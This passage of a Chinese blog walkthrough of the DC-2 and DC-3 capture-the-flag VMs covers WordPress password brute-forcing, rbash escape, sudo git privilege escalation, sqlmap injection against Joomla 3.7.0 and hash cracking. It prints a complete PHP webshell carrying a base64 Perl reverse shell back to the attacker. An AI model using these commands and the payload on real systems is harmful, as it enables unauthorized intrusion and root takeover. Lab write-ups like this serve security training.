密码枚举爆破</h4><p>继续用WPscan，用刚刚生成的users.txt和dict.txt两个字典</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url dc-2 -U /home/bamboo/桌面/users.txt -P /home/bamb/桌面/dict.txt</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717124605473.png" alt="image-20230717124605473" style="zoom:45%;"><p>爆破出了jerry和tom的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">| Username: jerry, Password: adipiscing</span><br><span class="line">| Username: tom, Password: parturient</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717125433194.png" alt="image-20230717125433194" style="zoom:44%;"><p>登录进去后拿到第2个flag，提示了我们不能直接通过cms漏洞拿到shell了，让我们找另一种方法</p><h3 id="三、-主机端渗透"><a href="#三、-主机端渗透" class="headerlink" title="三、 主机端渗透"></a>三、 主机端渗透</h3><h4 id="1-ssh协议远程登入"><a href="#1-ssh协议远程登入" class="headerlink" title="1. ssh协议远程登入"></a>1. <a href="https://so.csdn.net/so/search?q=ssh%E5%8D%8F%E8%AE%AE&spm=1001.2101.3001.7020">ssh协议</a>远程登入</h4><p>ssh这东西呢是能用工具<strong>hydra</strong>通过爆破拿到，前面我们已经拿到过两个账号的用户名和密码，在这里先试一下，因为之前扫描出ssh的端口在7744，所以我们可以用下面的命令登入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 用户名@主机地址 -p 端口</span><br></pre></td></tr></table></figure><p>我们尝试登入一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jerry@192.168.85.131 -p 7744</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717211938201.png" alt="image-20230717211938201" style="zoom:50%;"><p>登进去让输入密码，但是不管怎么输密码都说permission denied，想起之前flag1的提示，如果不行就换一个</p><p>于是我们尝试用tom登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.85.131 -p 7744</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717212414098.png" alt="image-20230717212414098" style="zoom:50%;"><p>成功登进去了,查看一下权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717212528338.png" alt="image-20230717212528338" style="zoom:50%;"><p><strong>什么是rbash</strong></p><ul><li>它与一般shell的区别在于会限制一些行为，让一些命令无法执行</li><li>可以理解为权限很低的用户</li></ul><p>我们先来看一下rbash限制后能进行那些操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">#查看上面得到path路径的所有文件</span><br><span class="line">#运行结果 /home/tom/usr/bin</span><br><span class="line">echo /home/tom/usr/bin/*</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717215634030.png" alt="image-20230717215634030" style="zoom:50%;"><p>可以看见能用这四个命令，唯一有用的就只有vi（编辑器）这个命令，这里可以里用vi或者是BASH_CMDS设置shell来绕过rbash，然后再设置环境变量添加命令</p><p>这里我们可以直接用<strong>less</strong>命令查看flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">less f*</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717214556944.png" alt="image-20230717214556944" style="zoom:50%;"><p>这样就能直接拿到flag3，但是之后su切换用户时得提权</p><h4 id="2-rbash逃逸（Linux提权的一种）"><a href="#2-rbash逃逸（Linux提权的一种）" class="headerlink" title="2. rbash逃逸（Linux提权的一种）"></a>2. rbash逃逸（<a href="https://so.csdn.net/so/search?q=Linux%E6%8F%90%E6%9D%83&spm=1001.2101.3001.7020">Linux提权</a>的一种）</h4><p>具体方法可参考<a href="https://blog.csdn.net/qq_43168364/article/details/111830233">rbash逃逸方法总结</a></p><ul><li><strong>法一：vi设置shell</strong></li></ul><p>先进入vi编辑器界面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br></pre></td></tr></table></figure><p>然后按Esc键，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/bash</span><br></pre></td></tr></table></figure><p>设置好shell并回车，接着输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:shell</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717213442491.png" alt="image-20230717213442491" style="zoom:50%;"><p>当看到退出vi则说明成功，我们接着看一下权限，发现已经升级为bash了</p><img src="/2024/01/23/DC2%20&%20DC3/image-20230717213704666.png" alt="image-20230717213704666" style="zoom:50%;"><p>但是还是不能用cat，这里是环境变量的问题，用以下命令添加一下两条路径即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin/</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717214204203.png" alt="image-20230717214204203" style="zoom:50%;"><p>提示我们得su一下jerry</p><ul><li><strong>法二：BASH_CMDS设置shell</strong></li></ul><p>设置一下shell并执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[x]=/bin/bash</span><br><span class="line">#设置了个x变量shell</span><br><span class="line"></span><br><span class="line">x</span><br><span class="line">#相当于执行shell</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin/</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717215445363.png" alt="image-20230717215445363" style="zoom:50%;"><p>成功执行<strong>cat</strong>命令</p><p>flag提示我们得su一下jerry，su是Linux切换用户的命令</p><h4 id="3-su切换用户"><a href="#3-su切换用户" class="headerlink" title="3.su切换用户"></a>3.su切换用户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br></pre></td></tr></table></figure><p>再输入一下之前拿到的密码即可 登入进去</p><img src="/2024/01/23/DC2%20&%20DC3/image-20230717220154238.png" alt="image-20230717220154238" style="zoom:50%;"><p>查一下flag的文件有哪些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag*</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717220753046.png" alt="image-20230717220753046" style="zoom:50%;"><p>大多都没有权限，但是可以看到flag4.txt可以访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/jerry/flag4.txt</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717220902787.png" alt="image-20230717220902787" style="zoom:50%;"><p>flag4中只提示了git</p><h4 id="4-Git提权"><a href="#4-Git提权" class="headerlink" title="4. Git提权"></a>4. Git提权</h4><p>虽然flag给了我们提示，但是还是得找一下具有SUID权限的二进制文件的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717221222504.png" alt="image-20230717221222504" style="zoom:50%;"><p>参考<a href="https://www.freebuf.com/articles/web/272617.html">简谈SUID提权</a></p><p>但是一个能用的文件都没有，看来只能用git了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717221435554.png" alt="image-20230717221435554" style="zoom:50%;"><p>发现git能使用root的权限，这里有两种提权的姿势</p><ul><li><strong>第一种</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config</span><br></pre></td></tr></table></figure><p>回车然后输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!/bin/bash  (这里bash也可以换成sh)</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717222048432.png" alt="image-20230717222048432" style="zoom:50%;"><ul><li><strong>第二种</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help</span><br></pre></td></tr></table></figure><p>回车输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!/bin/bash  (这里bash也可以换成sh)</span><br></pre></td></tr></table></figure><p>提权后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /</span><br><span class="line">find / -name *flag*</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717222156719.png" alt="image-20230717222156719" style="zoom:50%;"><p>发现最终的flag</p><img src="/2024/01/23/DC2%20&%20DC3/image-20230717222246404.png" alt="image-20230717222246404" style="zoom:50%;"><p>成功拿到最终的flag</p><h2 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h2><p>环境的搭建和之前一样，但是在搭建的时候遇到一个问题，解决方案<a href="http://t.csdn.cn/WzUPC">http://t.csdn.cn/WzUPC</a></p><h3 id="一、信息搜集-1"><a href="#一、信息搜集-1" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><h4 id="1-探测目标主机IP地址-1"><a href="#1-探测目标主机IP地址-1" class="headerlink" title="1.探测目标主机IP地址"></a>1.探测目标主机IP地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230729103651046.png" alt="image-20230729103651046" style="zoom:50%;"><p>得到目标主机IP为192.168.85.132</p><h4 id="2-探测开放端口"><a href="#2-探测开放端口" class="headerlink" title="2.探测开放端口"></a>2.探测开放端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- 192.168.85.132</span><br></pre></td></tr></table></figure><p>-sV只扫描端口及其版本号</p><p>-A扫描端口的详细信息</p><img src="/2024/01/23/DC2%20&%20DC3/image-20230729104014464.png" alt="image-20230729104014464" style="zoom:50%;"><p>开放了80端口，还可以看到Apache版本，还有cms是Joomla</p><h4 id="3-网站信息搜集"><a href="#3-网站信息搜集" class="headerlink" title="3.网站信息搜集"></a>3.网站信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.85.132 -e * -i 200</span><br><span class="line"></span><br><span class="line">-i 状态码</span><br><span class="line">只显示该状态码</span><br><span class="line">-x 状态码</span><br><span class="line">不显示该状态码</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230729104528091.png" alt="image-20230729104528091" style="zoom:50%;"><p>扫出这些信息先放一下</p><h4 id="4-web页面信息探测"><a href="#4-web页面信息探测" class="headerlink" title="4.web页面信息探测"></a>4.web页面信息探测</h4><img src="/2024/01/23/DC2%20&%20DC3/image-20230729104735093.png" alt="image-20230729104735093" style="zoom:55%;"><p>访问目标IP，看到提示，说本关只有一个flag，需要具有root权限</p><img src="/2024/01/23/DC2%20&%20DC3/image-20230729105206052.png" alt="image-20230729105206052" style="zoom:55%;"><p>还可以看到网站的cms是Joomla</p><p>进入之前dirsearch扫出来的登录界面</p><img src="/2024/01/23/DC2%20&%20DC3/image-20230729105332954.png" alt="image-20230729105332954" style="zoom:55%;"><h3 id="二、漏洞查找"><a href="#二、漏洞查找" class="headerlink" title="二、漏洞查找"></a>二、漏洞查找</h3><h4 id="1-Joomscan"><a href="#1-Joomscan" class="headerlink" title="1.Joomscan"></a>1.Joomscan</h4><img src="/2024/01/23/DC2%20&%20DC3/image-20230729110832610.png" alt="image-20230729110832610" style="zoom:50%;"><p>扫到一下后台登录的路由，但是前面也是知道的</p><h4 id="2-searchsploit"><a href="#2-searchsploit" class="headerlink" title="2.searchsploit"></a>2.searchsploit</h4><p>searchsploit是一款kali自带的搜索漏洞信息的模块，可参考<a href="https://blog.csdn.net/whatday/article/details/102806149">searchsploit漏洞查找工具使用指南</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla 3.7.0</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230729111058493.png" alt="image-20230729111058493" style="zoom:50%;"><p>可以看到当前版本的joomla存在SQL注入漏洞和跨站扫描漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -p 42033.txt</span><br><span class="line">查完整路径</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230729113615247.png" alt="image-20230729113615247" style="zoom:50%;"><p>得到完整的路劲为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/exploitdb/exploits/php/webapps/42033.txt</span><br></pre></td></tr></table></figure><p>拷贝漏洞的详细信息到桌面，<strong>cp 要拷贝的文件 拷贝后的文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/42033.txt /home/bamboo/桌面/42033.txt</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230729114230688.png" alt="image-20230729114230688" style="zoom:62%;"><p>可以看到给出了漏洞的详细信息，包括注入点</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h4><p>利用sqlmap进行自动化注入，参考<a href="https://blog.csdn.net/qq_37964989/article/details/84109094">Sqlmap常用命令总结</a></p><p>因为之前已经看到了注入点，所以我们直接开始跑sqlmap</p><ul><li><p>列出所以数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.85.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -p list[fullordering] --batch --dbs</span><br><span class="line"></span><br><span class="line">--dbs列出所有数据库</span><br></pre></td></tr></table></figure></li></ul><img src="/2024/01/23/DC2%20&%20DC3/image-20230729115433552.png" alt="image-20230729115433552" style="zoom:50%;"><ul><li><p>列出指定数据库的所有表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.85.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -p list[fullordering] --batch -D joomladb --tables</span><br><span class="line"></span><br><span class="line">-D 指定数据库，当数据库名含有特殊符号的时候，需要用引号包括起来</span><br><span class="line">--tables 列出表</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230729115626752.png" alt="image-20230729115626752" style="zoom:50%;"><p>跑出表名后找到users表</p></li><li><p>查所以字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.85.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb -T &#x27;#__users&#x27; --columns</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">表名含有特殊符号，需要用引号包括</span><br><span class="line">这里就不能用--batch参数了，会默认使用公共参数爆破给N掉，导致注入失败，根据提示，手工输入y并回车即可</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230729120433998.png" alt="image-20230729120433998" style="zoom:50%;"></li><li><p>查看用户名与密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.85.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb -T &#x27;#__users&#x27; -C username,password --dump</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230729120558928.png" alt="image-20230729120558928" style="zoom:50%;"><p>拿到密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span><br></pre></td></tr></table></figure><p>但是没有加密函数，所以只有来爆破密码</p></li></ul><h4 id="2-密码爆破"><a href="#2-密码爆破" class="headerlink" title="2.密码爆破"></a>2.密码爆破</h4><p>利用John工具，对该密码进行爆破拆解，工具详细信息参考<a href="https://blog.csdn.net/blue_starry_sky/article/details/61206488">John介绍及常用命令使用说明</a></p><p>先在桌面创建一个文件，将上面的hash密码复制进去并保存，接着使用john指向该文件</p><img src="/2024/01/23/DC2%20&%20DC3/image-20230729121100956.png" alt="image-20230729121100956" style="zoom:50%;"><p>爆出密码snoopy</p><p>成功登入后台</p><img src="/2024/01/23/DC2%20&%20DC3/image-20230729121430144.png" alt="image-20230729121430144" style="zoom:50%;"><h4 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h4><p>探索后台管理员系统，发现了文件上传的点位，在beez3模块里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.85.132/administrator/index.php?option=com_templates&amp;view=template&amp;id=503&amp;file=aG9tZQ==</span><br></pre></td></tr></table></figure><blockquote><p>通过对后台的探测，发现Extensions-&gt;Templates里面的模板可以执行PHP脚本</p></blockquote><img src="/2024/01/23/DC2%20&%20DC3/image-20230729122722672.png" alt="image-20230729122722672" style="zoom:50%;"><p>点击new file创建一个webshell.php的文件</p><img src="/2024/01/23/DC2%20&%20DC3/image-20230729122848649.png" alt="image-20230729122848649" style="zoom:50%;"><p>将php反弹shell的脚本粘上去，这里直接用网上大佬的脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span>(<span class="params"><span class="variable">$pr</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$path</span> = <span class="title function_ invoke__">execute</span>(<span class="string">&quot;which <span class="subst">$pr</span>&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> (<span class="variable">$path</span> ? <span class="variable">$path</span> : <span class="variable">$pr</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$cfe</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cfe</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">exec</span>(<span class="variable">$cfe</span>,<span class="variable">$res</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">join</span>(<span class="string">&quot;\n&quot;</span>,<span class="variable">$res</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line"><span class="variable">$res</span> = @<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cfe</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">system</span>(<span class="variable">$cfe</span>);</span><br><span class="line"><span class="variable">$res</span> = @<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">@<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">passthru</span>(<span class="variable">$cfe</span>);</span><br><span class="line"><span class="variable">$res</span> = @<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">@<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">&#125; <span class="keyword">elseif</span>(@<span class="title function_ invoke__">is_resource</span>(<span class="variable">$f</span> = @<span class="title function_ invoke__">popen</span>(<span class="variable">$cfe</span>,<span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$f</span>)) &#123;</span><br><span class="line"><span class="variable">$res</span> .= @<span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>,<span class="number">1024</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">pclose</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span>(<span class="params"><span class="variable">$fname</span>,<span class="variable">$text</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$fp</span>=@<span class="title function_ invoke__">fopen</span>(<span class="variable">$fname</span>,<span class="string">&#x27;w&#x27;</span>)) &#123;</span><br><span class="line">@<span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>,@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$text</span>));</span><br><span class="line">@<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$yourip</span> = <span class="string">&quot;your IP&quot;</span>;</span><br><span class="line"><span class="variable">$yourport</span> = <span class="string">&#x27;your port&#x27;</span>;</span><br><span class="line"><span class="variable">$usedb</span> = <span class="keyword">array</span>(<span class="string">&#x27;perl&#x27;</span>=&gt;<span class="string">&#x27;perl&#x27;</span>,<span class="string">&#x27;c&#x27;</span>=&gt;<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="variable">$back_connect</span>=<span class="string">&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;</span>.</span><br><span class="line"><span class="string">&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;</span>.</span><br><span class="line"><span class="string">&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;</span>.</span><br><span class="line"><span class="string">&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;</span>.</span><br><span class="line"><span class="string">&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;</span>.</span><br><span class="line"><span class="string">&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;</span>.</span><br><span class="line"><span class="string">&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">cf</span>(<span class="string">&#x27;/tmp/.bc&#x27;</span>,<span class="variable">$back_connect</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">execute</span>(<span class="title function_ invoke__">which</span>(<span class="string">&#x27;perl&#x27;</span>).<span class="string">&quot; /tmp/.bc <span class="subst">$yourip</span> <span class="subst">$yourport</span> &amp;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>保存就上传好啦，再根据joomla的特性，模块会单独放在一个文件夹里&#x2F;templates&#x2F;，而beez3模块就在&#x2F;templates&#x2F;beez3&#x2F;里面，刚才创建的webshell路径为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.85.132/templates/beez3/webshell.php</span><br></pre></td></tr></table></figure><p>kali监听2222端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 8888</span><br></pre></td></tr></table></figure><p>接着去访问webshell的地址就能成功执行反弹shell脚本</p><p>我在复现的时候这步访问webshell一直是404，于是我把反弹shell的脚本写在了index.txt中，直接访问192.168.85.132&#x2F;index.txt，反弹成功</p><img src="/2024/01/23/DC2%20&%20DC3/image-20230729125145137.png" alt="image-20230729125145137" style="zoom:50%;"><h4 id="4-交互式shell"><a href="#4-交互式shell" class="headerlink" title="4.交互式shell"></a>4.交互式shell</h4><p>跟DC-1一样，利用python获取交互shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230729125440254.png" alt="image-20230729125440254" style="zoom:50%;"><h3 id="三、linux提权"><a href="#三、linux提权" class="headerlink" 